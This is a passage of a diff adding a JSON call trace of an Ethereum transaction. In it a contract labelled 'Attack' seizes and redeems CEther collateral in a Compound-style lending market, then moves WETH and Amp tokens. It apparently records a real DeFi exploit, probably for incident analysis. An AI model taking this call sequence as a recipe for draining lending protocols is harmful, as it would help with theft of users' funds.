+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "decimals()",
+        "inputs": {},
+        "return_value": [
+            18
+        ],
+        "fromName": "PriceOracleProxy",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x338EEE1F7B89CE6272f302bDC4b952C13b221f1d",
+        "op": "STATICCALL",
+        "function": "getUnderlyingPrice(address)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE"
+        },
+        "return_value": [
+            1000000000000000000
+        ],
+        "fromName": "Comptroller",
+        "toName": "PriceOracleProxy"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "exchangeRateStored()",
+        "inputs": {},
+        "return_value": [
+            206848892548606231814997144
+        ],
+        "fromName": "Comptroller",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "owner": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            2417223480577
+        ],
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "CEther"
+    },
+    {
+        "from": "0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "CALL",
+        "value": 0,
+        "function": "seize(address,address,uint256)",
+        "inputs": {
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "seizeTokens": 906862180000
+        },
+        "fromName": "CCollateralCapErc20Delegate",
+        "toName": "CEther"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "seizeAllowed(address,address,address,address,uint256)",
+        "inputs": {
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "seizeTokens": 906862180000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "seizeAllowed(address,address,address,address,uint256)",
+        "inputs": {
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "seizeTokens": 906862180000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+        "op": "STATICCALL",
+        "function": "comptroller()",
+        "inputs": {},
+        "return_value": [
+            0
+        ],
+        "fromName": "Comptroller",
+        "toName": "CErc20Delegator"
+    },
+    {
+        "from": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "comptroller()",
+        "inputs": {},
+        "return_value": [
+            0
+        ],
+        "fromName": "Comptroller",
+        "toName": "CEther"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "seizeVerify(address,address,address,address,uint256)",
+        "inputs": {
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "seizeTokens": 906862180000
+        },
+        "return_value": null,
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "seizeVerify(address,address,address,address,uint256)",
+        "inputs": {
+            "cTokenCollateral": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "cTokenBorrowed": "0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6",
+            "liquidator": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "borrower": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "seizeTokens": 906862180000
+        },
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "owner": "0x0ec306D7634314D35139d1dF4A630d829475A125"
+        },
+        "return_value": [
+            906862180000
+        ],
+        "toName": "CEther"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "op": "CALL",
+        "value": 0,
+        "function": "redeem(uint256)",
+        "inputs": {
+            "redeemTokens": 906862180000
+        },
+        "return_value": [
+            0
+        ],
+        "toName": "CEther"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "redeemAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "redeemer": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "redeemTokens": 906862180000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "redeemAllowed(address,address,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "redeemer": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "redeemTokens": 906862180000
+        },
+        "return_value": [
+            0
+        ],
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "op": "CALL",
+        "value": 187583437627214803345,
+        "calldata": "0x",
+        "fromName": "CEther"
+    },
+    {
+        "from": "0xD06527D5e56A3495252A528C4987003b712860eE",
+        "to": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "op": "CALL",
+        "value": 0,
+        "function": "redeemVerify(address,address,uint256,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "redeemer": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "redeemAmount": 187583437627214803345,
+            "redeemTokens": 906862180000
+        },
+        "return_value": null,
+        "fromName": "CEther",
+        "toName": "Unitroller"
+    },
+    {
+        "from": "0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258",
+        "to": "0x02E795EEc131246128346D17d2f564D7bF7C705b",
+        "op": "DELEGATECALL",
+        "function": "redeemVerify(address,address,uint256,uint256)",
+        "inputs": {
+            "cToken": "0xD06527D5e56A3495252A528C4987003b712860eE",
+            "redeemer": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+            "redeemAmount": 187583437627214803345,
+            "redeemTokens": 906862180000
+        },
+        "fromName": "Unitroller",
+        "toName": "Comptroller"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 187583437627214803345,
+        "function": "deposit()",
+        "inputs": {},
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "": "0x0ec306D7634314D35139d1dF4A630d829475A125"
+        },
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x0ec306D7634314D35139d1dF4A630d829475A125",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "dst": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "wad": 187583437627214803345
+        },
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 355000000000000000000,
+        "function": "deposit()",
+        "inputs": {},
+        "fromName": "Attack",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Attack",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "dst": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E",
+            "wad": 501550000000000000000
+        },
+        "fromName": "Attack",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E",
+        "to": "0x66a0f676479Cee1d7373f3DC2e2952778BfF5bd6",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "account": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E"
+        },
+        "fromName": "UniswapV2Pair",
+        "toName": "WiseToken"
+    },
+    {
+        "from": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "": "0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E"
+        },
+        "fromName": "UniswapV2Pair",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "_tokenHolder": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "return_value": [
+            9740000000000000000000000
+        ],
+        "fromName": "Attack",
+        "toName": "Amp"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "_to": "0xcE1F4B4F17224ec6df16Eeb1e3e5321c54Ff6EDe",
+            "_value": 9740000000000000000000000
+        },
+        "return_value": [
+            true
+        ],
+        "fromName": "Attack",
+        "toName": "Amp"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+            "_interfaceHash": "0x60881b58a7ad1ebd3bc0e92b8277996363a67ded0f43bd95d11c320bab72b5a4"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0xfF20817765cB7f73d4bde2e66e067E58D11095C2",
+        "to": "0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24",
+        "op": "STATICCALL",
+        "function": "getInterfaceImplementer(address,bytes32)",
+        "inputs": {
+            "_addr": "0xcE1F4B4F17224ec6df16Eeb1e3e5321c54Ff6EDe",
+            "_interfaceHash": "0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a"
+        },
+        "return_value": [
+            "0x0000000000000000000000000000000000000000"
+        ],
+        "fromName": "Amp",
+        "toName": "ERC1820Registry"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "STATICCALL",
+        "function": "balanceOf(address)",
+        "inputs": {
+            "": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B"
+        },
+        "fromName": "Attack",
+        "toName": "WETH9"
+    },
+    {
+        "from": "0x38c40427efbAAe566407e4CdE2A91947dF0bD22B",
+        "to": "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
+        "op": "CALL",
+        "value": 0,
+        "function": "transfer(address,uint256)",
+        "inputs": {
+            "dst": "0xcE1F4B4F17224ec6df16Eeb1e3e5321c54Ff6EDe",
+            "wad": 41033437627214803345
+        },
+        "fromName": "Attack",
+        "toName": "WETH9"
+    }
+]
